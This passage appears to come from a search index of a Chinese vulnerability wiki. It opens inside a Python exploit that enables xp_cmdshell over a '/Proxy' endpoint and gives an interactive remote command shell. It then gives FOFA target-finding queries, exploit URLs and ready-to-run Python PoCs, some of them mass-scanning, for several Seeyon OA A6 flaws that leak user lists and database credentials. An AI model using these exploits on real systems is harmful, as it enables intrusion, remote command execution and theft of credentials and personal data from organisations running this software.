'cVer=9.8.0&dp=<?xml version=\"1.0\" encoding=\"GB2312\"?><R9PACKET version=\"1\"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format=\"text\">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format=\"text\"> {} </DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>' . format ( sql ) try : print ( \" \\033 [32m[o] \u6b63\u5728\u6267\u884cSQL\u8bed\u53e5: {} ... \\033 [0m\" . format ( sql )) response = requests . post ( url = open_url , headers = headers , data = data , timeout = 10 ) num = num + 1 if num == 5 : POC_2 ( target_url , db_name ) except : print ( \" \\033 [31m[x] \u5f00\u542f xp_cmdsheall \u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) def POC_2 ( target_url , db_name ): db_name = db_name sql_cmd_url = target_url + \"/Proxy\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Content-Type\" : \"application/x-www-form-urlencoded\" } data = \"\"\"cVer=9.8.0&dp=<?xml version=\"1.0\" encoding=\"GB2312\"?><R9PACKET version=\"1\"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format=\"text\">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format=\"text\">exec xp_cmdshell \"whoami\"</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>\"\"\" try : print ( \" \\033 [32m[o] \u6b63\u5728\u6267\u884cSQL\u8bed\u53e5:exec xp_cmdshell 'whoami'... \\033 [0m\" ) response = requests . post ( url = sql_cmd_url , headers = headers , data = data , timeout = 10 ) if 'exec xp_cmdshell' in response . text : print ( \" \\033 [31m[x] \u6570\u636e\u5e93\u672a\u5f00\u542f xp_cmdshell \u6a21\u5757 \\033 [0m\" ) sqlcmd_open = str ( input ( \" \\033 [35m\u662f\u5426\u5f00\u542f xp_cmdshell \\n (Y/N) >>> \\033 [0m\" )) if sqlcmd_open == 'Y' or sqlcmd_open == 'y' : xp_cmdshell_open ( target_url , db_name ) else : print ( \" \\033 [31m[x] \u505c\u6b62\u5f00\u542f xp_cmdshell \\033 [0m\" ) sys . exit ( 0 ) else : whoami = re . findall ( r 'output=\"(.*?)\"' , response . text )[ 0 ] print ( \" \\033 [32m[o] \u6210\u529f\u6267\u884cSQL\u8bed\u53e5:exec xp_cmdshell 'whoami'... \\n >>> {} \\033 [0m\" . format ( whoami )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25: {} \\033 [0m\" . format ( e )) sys . exit ( 0 ) def POC_3 ( target_url , cmd ): vuln_url = target_url + \"/Proxy\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Content-Type\" : \"application/x-www-form-urlencoded\" } data = 'cVer=9.8.0&dp=<?xml version=\"1.0\" encoding=\"GB2312\"?><R9PACKET version=\"1\"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format=\"text\">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format=\"text\">exec xp_cmdshell \" {} \"</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>' . format ( cmd ) try : print ( \" \\033 [32m[o] \u6b63\u5728\u6267\u884cSQL\u8bed\u53e5:exec xp_cmdshell ' {} '... \\033 [0m\" . format ( cmd )) response = requests . post ( url = vuln_url , headers = headers , data = data , timeout = 10 ) data = re . findall ( r 'output=\"(.*?)\"' , response . text ) for i in data : print ( \" \\033 [32m >>> {} \\033 [0m\" . format ( i )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25: {} \\033 [0m\" . format ( e )) sys . exit ( 0 ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) db_name = POC_1 ( target_url ) POC_2 ( target_url , db_name ) while True : cmd = input ( \" \\033 [35mCmd >>> \\033 [0m\" ) if cmd == \"exit\" : sys . exit ( 0 ) else : POC_3 ( target_url , cmd )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20DownExcelBeanServlet%20%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/","text":"\u81f4\u8fdcOA A6 DownExcelBeanServlet \u7528\u6237\u654f\u611f\u4fe1\u606f\u6cc4\u9732 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u81f4\u8fdcOA A6 \u5b58\u5728\u67d0\u4e2a\u672a\u6388\u6743\u7684\u63a5\u53e3\u5bfc\u81f4\u4efb\u610f\u8bbf\u95ee\u8005\u53ef\u4e0b\u8f7dOA\u4e2d\u7684\u7528\u6237\u4fe1\u606f \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u81f4\u8fdcOA A6 FOFA \u00b6 [!NOTE] title=\"\u81f4\u8fdcA8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6.A6\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u8bbf\u95ee\u5982\u4e0bURL\u5373\u53ef\u8df3\u8f6c\u4e0b\u8f7d\u7528\u6237\u4fe1\u606f\u6587\u4ef6 http://xxx.xxx.xxx.xxx/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0 \u53ef\u4ee5\u518d\u5229\u7528\u5f97\u5230\u7684\u7528\u6237\u540d\u4f7f\u7528\u5f31\u53e3\u4ee4\u7206\u7834\u8fdb\u5165OA\u8fdb\u4e00\u6b65\u653b\u51fb \u6f0f\u6d1e\u5229\u7528POC \u00b6 import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u81f4\u8fdcOA A6 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mFile >>> ip.txt \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) if \"@\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e,\u4e0b\u8f7d\u5730\u5740: {} \\033 [0m\" . format ( target_url , vuln_url )) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def Scan ( file_name ): with open ( file_name , \"r\" , encoding = 'utf8' ) as scan_url : for url in scan_url : if url [: 4 ] != \"http\" : url = \"http://\" + url url = url . strip ( ' \\n ' ) try : POC_1 ( url ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u62a5\u9519 \\033 [0m\" . format ( e )) continue if __name__ == '__main__' : title () file_name = str ( input ( \" \\033 [35mPlease input Attack File \\n File >>> \\033 [0m\" )) Scan ( file_name ) Goby & POC \u00b6 [!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d Seeyon_OA_A6_DownExcelBeanServlet_User_information_leakage","title":"\u81f4\u8fdcOA A6 DownExcelBeanServlet \u7528\u6237\u654f\u611f\u4fe1\u606f\u6cc4\u9732"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20DownExcelBeanServlet%20%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#\u81f4\u8fdcoa-a6-downexcelbeanservlet-\u7528\u6237\u654f\u611f\u4fe1\u606f\u6cc4\u9732","text":"","title":"\u81f4\u8fdcOA A6 DownExcelBeanServlet \u7528\u6237\u654f\u611f\u4fe1\u606f\u6cc4\u9732"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20DownExcelBeanServlet%20%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u81f4\u8fdcOA A6 \u5b58\u5728\u67d0\u4e2a\u672a\u6388\u6743\u7684\u63a5\u53e3\u5bfc\u81f4\u4efb\u610f\u8bbf\u95ee\u8005\u53ef\u4e0b\u8f7dOA\u4e2d\u7684\u7528\u6237\u4fe1\u606f","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20DownExcelBeanServlet%20%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u81f4\u8fdcOA A6","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20DownExcelBeanServlet%20%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#fofa","text":"[!NOTE] title=\"\u81f4\u8fdcA8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6.A6\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20DownExcelBeanServlet%20%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#\u6f0f\u6d1e\u590d\u73b0","text":"\u8bbf\u95ee\u5982\u4e0bURL\u5373\u53ef\u8df3\u8f6c\u4e0b\u8f7d\u7528\u6237\u4fe1\u606f\u6587\u4ef6 http://xxx.xxx.xxx.xxx/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0 \u53ef\u4ee5\u518d\u5229\u7528\u5f97\u5230\u7684\u7528\u6237\u540d\u4f7f\u7528\u5f31\u53e3\u4ee4\u7206\u7834\u8fdb\u5165OA\u8fdb\u4e00\u6b65\u653b\u51fb","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20DownExcelBeanServlet%20%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#\u6f0f\u6d1e\u5229\u7528poc","text":"import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u81f4\u8fdcOA A6 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mFile >>> ip.txt \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) if \"@\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e,\u4e0b\u8f7d\u5730\u5740: {} \\033 [0m\" . format ( target_url , vuln_url )) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def Scan ( file_name ): with open ( file_name , \"r\" , encoding = 'utf8' ) as scan_url : for url in scan_url : if url [: 4 ] != \"http\" : url = \"http://\" + url url = url . strip ( ' \\n ' ) try : POC_1 ( url ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u62a5\u9519 \\033 [0m\" . format ( e )) continue if __name__ == '__main__' : title () file_name = str ( input ( \" \\033 [35mPlease input Attack File \\n File >>> \\033 [0m\" )) Scan ( file_name )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20DownExcelBeanServlet%20%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#goby--poc","text":"[!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d Seeyon_OA_A6_DownExcelBeanServlet_User_information_leakage","title":"Goby &amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20createMysql.jsp%20%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/","text":"\u81f4\u8fdcOA A6 createMysql.jsp \u6570\u636e\u5e93\u654f\u611f\u4fe1\u606f\u6cc4\u9732 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u81f4\u8fdcOA A6 \u5b58\u5728\u6570\u636e\u5e93\u654f\u611f\u4fe1\u606f\u6cc4\u9732\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u8bbf\u95ee\u7279\u5b9a\u7684URL\u83b7\u53d6\u6570\u636e\u5e93\u8d26\u6237\u4ee5\u53ca\u5bc6\u7801 MD5 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u81f4\u8fdcOA A6 FOFA \u00b6 [!NOTE] title=\"\u81f4\u8fdcA8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6.A6\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u5f53\u8bbf\u95ee\u5982\u4e0bURL\u65f6\u6267\u884c\u4e86SQL\u8bed\u53e5 select * from mysql.user; \u8fdb\u884c\u67e5\u8be2\u5e76\u8fd4\u56de\u5230\u9875\u9762\u4e2d /yyoa/createMysql.jsp /yyoa/ext/createMysql.jsp \u6f0f\u6d1e\u5229\u7528POC \u00b6 import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u81f4\u8fdcOA A6 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/yyoa/createMysql.jsp\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42 {} /yyoa/createMysql.jsp..... \\033 [0m\" . format ( target_url )) if 'root' in response . text and response . status_code == 200 : print ( \" \\033 [36m[o] \u54cd\u5e94\u4e3a: {} \\n \\033 [0m\" . format ( response . text )) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0a\u4f20Webshell\u6587\u4ef6\u5931\u8d25 \\033 [0m\" . format ( target_url )) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url ) Goby & POC \u00b6 [!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d Seeyon_OA_A6__Disclosure_of_database_sensitive_information","title":"\u81f4\u8fdcOA A6 createMysql.jsp \u6570\u636e\u5e93\u654f\u611f\u4fe1\u606f\u6cc4\u9732"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20createMysql.jsp%20%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#\u81f4\u8fdcoa-a6-createmysqljsp-\u6570\u636e\u5e93\u654f\u611f\u4fe1\u606f\u6cc4\u9732","text":"","title":"\u81f4\u8fdcOA A6 createMysql.jsp \u6570\u636e\u5e93\u654f\u611f\u4fe1\u606f\u6cc4\u9732"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20createMysql.jsp%20%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u81f4\u8fdcOA A6 \u5b58\u5728\u6570\u636e\u5e93\u654f\u611f\u4fe1\u606f\u6cc4\u9732\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u8bbf\u95ee\u7279\u5b9a\u7684URL\u83b7\u53d6\u6570\u636e\u5e93\u8d26\u6237\u4ee5\u53ca\u5bc6\u7801 MD5","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20createMysql.jsp%20%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u81f4\u8fdcOA A6","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20createMysql.jsp%20%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#fofa","text":"[!NOTE] title=\"\u81f4\u8fdcA8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6.A6\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20createMysql.jsp%20%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#\u6f0f\u6d1e\u590d\u73b0","text":"\u5f53\u8bbf\u95ee\u5982\u4e0bURL\u65f6\u6267\u884c\u4e86SQL\u8bed\u53e5 select * from mysql.user; \u8fdb\u884c\u67e5\u8be2\u5e76\u8fd4\u56de\u5230\u9875\u9762\u4e2d /yyoa/createMysql.jsp /yyoa/ext/createMysql.jsp","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20createMysql.jsp%20%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#\u6f0f\u6d1e\u5229\u7528poc","text":"import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u81f4\u8fdcOA A6 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/yyoa/createMysql.jsp\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42 {} /yyoa/createMysql.jsp..... \\033 [0m\" . format ( target_url )) if 'root' in response . text and response . status_code == 200 : print ( \" \\033 [36m[o] \u54cd\u5e94\u4e3a: {} \\n \\033 [0m\" . format ( response . text )) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0a\u4f20Webshell\u6587\u4ef6\u5931\u8d25 \\033 [0m\" . format ( target_url )) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20createMysql.jsp%20%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#goby--poc","text":"[!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d Seeyon_OA_A6__Disclosure_of_database_sensitive_information","title":"Goby &amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20initDataAssess.jsp%20%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/","text":"\u81f4\u8fdcOA A6 initDataAssess.jsp \u7528\u6237\u654f\u611f\u4fe1\u606f\u6cc4\u9732 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u81f4\u8fdcOA A6 initDataAssess.jsp \u5b58\u5728\u7528\u6237\u654f\u611f\u4fe1\u606f\u6cc4\u9732 \u53ef\u4ee5\u901a\u8fc7\u5f97\u5230\u7684\u7528\u6237\u540d\u7206\u7834\u7528\u6237\u5bc6\u7801\u8fdb\u5165\u540e\u53f0\u8fdb\u4e00\u6b65\u653b\u51fb \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u81f4\u8fdcOA A6 FOFA \u00b6 [!NOTE] title=\"\u81f4\u8fdcA8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6.A6\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u8bbf\u95ee\u4e0b\u5217URL\u6cc4\u9732\u7528\u6237\u4fe1\u606f http://xxx.xxx.xxx.xxx/yyoa/assess/js/initDataAssess.jsp \u6f0f\u6d1e\u5229\u7528POC \u00b6 import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u81f4\u8fdcOA A6 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mFile >>> ip.txt \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/yyoa/assess/js/initDataAssess.jsp\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) if \"/yyoa/index.jsp\" not in response . text and \"personList\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e,\u6cc4\u9732\u5730\u5740: {} \\033 [0m\" . format ( target_url , vuln_url )) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" ) def Scan ( file_name ): with open ( file_name , \"r\" , encoding = 'utf8' ) as scan_url : for url in scan_url : if url [: 4 ] != \"http\" : url = \"http://\" + url url = url . strip ( ' \\n ' ) try : POC_1 ( url ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u62a5\u9519 \\033 [0m\" ) continue if __name__ == '__main__' : title () file_name = str ( input ( \" \\033 [35mPlease input Attack File \\n File >>> \\033 [0m\" )) Scan ( file_name ) Goby & POC \u00b6 [!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d 